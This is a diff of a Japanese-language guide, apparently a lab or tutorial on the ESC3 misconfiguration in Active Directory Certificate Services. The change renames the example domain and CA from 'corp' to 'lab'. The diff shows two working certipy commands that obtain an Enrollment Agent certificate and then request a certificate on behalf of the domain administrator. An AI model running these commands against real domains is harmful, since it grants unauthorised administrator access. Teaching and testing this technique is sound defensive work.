@@ -24,11 +24,11 @@ ESC3 は、このテンプレートに低権限ユーザーでも登録できる
 
 ```
 # 1. Enrollment Agent 証明書を取得
-certipy req -u user@corp.local -p 'Password123' -ca 'CORP-CA' -template 'EnrollmentAgent'
+certipy req -u user@lab.local -p 'Password123' -ca 'LAB-CA' -template 'EnrollmentAgent'
 
 # 2. その代理権限で管理者用証明書を発行
-certipy req -u user@corp.local -p 'Password123' -ca 'CORP-CA' -template 'User' \
-  -on-behalf-of 'corp\administrator' -pfx user.pfx
+certipy req -u user@lab.local -p 'Password123' -ca 'LAB-CA' -template 'User' \
+  -on-behalf-of 'lab\administrator' -pfx user.pfx
 ```
 
 ## 注意点
